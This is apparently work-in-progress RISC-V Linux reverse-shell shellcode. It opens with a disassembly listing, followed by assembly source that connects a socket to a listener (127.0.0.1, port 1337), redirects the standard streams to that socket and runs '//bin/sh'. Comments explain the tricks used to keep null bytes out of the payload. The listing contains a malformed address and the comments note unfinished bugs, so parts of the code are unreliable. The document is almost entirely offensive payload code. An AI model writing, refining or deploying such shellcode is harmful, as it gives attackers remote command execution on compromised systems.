#10078:	00200513   li	a0,2 <
#1007c:	00100593   li	a1,1 <
#10080:	00000613   li	a2,0 <
#10084:	0c600893   li	a7,198 <
#10088:	00000073   ecall <
#1008c:	ff010113   addi	sp,sp,-16
#10090:	00200293   li	t0,2 <
#10094:	00513023   sd	t0,0(sp) <
#10098:	000042b7   lui	t0,0x4 <
#1009c:	9052829b   addiw	t0,t0,-1787
#100a0:	00513123   sd	t0,2(sp) <
#100t0:	010002b7   lui	t0,0x1000 <
#100a8:	07f2829b   addiw	t0,t0,127
#100ac:	00513223   sd	t0,4(sp) <
#100b0:	00000593   li	a1,0 <
#100b4:	00010593   mv	a1,sp <
#100b8:	01000613   li	a2,16 <
#100bc:	0cb00893   li	a7,203 <
#100c0:	00000293   li	t0,0 <
#100c4:	00050293   mv	t0,a0 <
#100c8:	00000073   ecall <
#100cc:	00000513   li	a0,0 < 
#100d0:	00028513   mv	a0,t0 <
#100d4:	00000593   li	a1,0 <
#100d8:	00000613   li	a2,0 <
#100dc:	01800893   li	a7,24 <
#100e0:	00000073   ecall <
#100e4:	00000513   li	a0,0 <
#100e8:	00028513   mv	a0,t0 <
#100ec:	00100593   li	a1,1 <
#100f0:	00000073   ecall <
#100f4:	00000513   li	a0,0 <
#100f8:	00028513   mv	a0,t0 <
#100fc:	00200593   li	a1,2 <
#10100:	00000073   ecall <
#10104:	69623537   lui	a0,0x69623
#10108:	f2f5051b   addiw	a0,a0,-209
#1010c:	ff810113   addi	sp,sp,-8
#10110:	00a13023   sd	a0,0(sp) <
#10114:	687338b7   lui	a7,0x68733
#10118:	f6e8889b   addiw	a7,a7,-146
#1011c:	01113223   sd	a7,4(sp)
#10120:	00000893   li	a7,0 <
#10124:	01110893   addi	a7,sp,17 
#10128:	00000513   li	a0,0 <
#1012c:	fef88513   addi	a0,a7,-17
#10130:	00000613   li	a2,0 <
#10134:	00000593   li	a1,0 <
#10138:	00100893   li	a7,1 <
#1013c:	0dc88893   addi	a7,a7,220
#10140:	00000073   ecall <
#10144:	00000513   li	a0,0 <
#10148:	00000893   li	a7,0 <
#1014c:	05d88893   addi	a7,a7,93
#10150:	00000073   ecall <
.section .text
.globl _start

/*
AF_INET=2
SOCK_STREAM=1
inet_addr=0x100007f
port=0x3905
sizeof(sockaddr_in)=16
*/

/*
struct sockaddr_in {
    sa_family_t    sin_family; // address family: AF_INET
    in_port_t      sin_port;   // port in network byte order
    struct in_addr sin_addr;   // internet address
};
*/

_start:
	#socket(AF_INET, SOCK_STREAM, 0);
	xor a0,a7,a7
	xor a1,a7,a7
	xor a2,a7,a7
	xor a7,a7,a7
	addi a0,a7,0xe2
	addi a0,a0,-0xe0
	addi a1,a7,0xe1
	addi a1,a1,-0xe0
	addi a7,a7,0xee
	addi a7,a7,-40
	ecall #socket fd in a0
	#create sockaddr_in
	addi sp,sp,-16
	xor a7,a7,a7
	addi a7,a7,0xe2
	addi a7,a7,-0xe0 #sizeof(AF_INET)=2
	sd a7,0(sp)
	xor a7,a7,a7
	addi a7,a7,0x52f
	xor t0,a7,a7
	addi t0,t0,0xeb
	addi t0,t0,-0xe0
	mul a7,a7,t0 #addi a7,a7,0x3905 
	sd a7,2(sp)
	li a7,0x100007f #127.0.0.1 - LHOST, this will need some logic too fix the fact that null's can exist
	sd a7,4(sp)
	xor a1,a7,a7
	or a1,a1,sp #TODO sp seems to break or
	#a2 is already 0 from above
	addi a2,a2,0xf0
	addi a2,a2,-0xe0
	#connect(a0,&sa,16)
	xor a7,a7,a7
	addi a7,a7,0xee
	addi a7,a7,-35 #__NR_connect 203
	#ecall will clobber a0/socket fd
	xor t0,a7,a7
	addi t0,a0,1337 #added a value to hide my nulls, this will need subbed later
	ecall
	#dup2(a0,{1,2,3})
	xor a0,a7,a7
	addi a0,t0,-1337
	xor a1,a7,a7
	xor a2,a7,a7
	xor a7,a7,a7
	addi a7,a7,0xee
	addi a7,a7,-0xd6 #__NR_dup3 24
	ecall
	xor a0,a7,a7
	addi a0,t0,-1337
	addi a1,a7,-23 # 24 -> 1
	ecall
	xor a0,a7,a7
	addi a0,t0,-1337
	addi a1,a7,-22 # 24 -> 2
	ecall
	
	#execve("//bin/sh",NULL,NULL);
        li a7,0x69622f2f #ib//
        addi sp,sp,-8
        sd a7,0(sp)
        li a7,0x68732f6e # hs/n 
        sd a7,4(sp)
        xor a7,a7,a7
        addi a7,sp,0x11
        xor a0,a7,a7
        addi a0,a7,-0x11
        xor a2,a7,a7
        xor a1,a7,a7
        xor a7,a7,a7
        addi a7,a7,221
        ecall
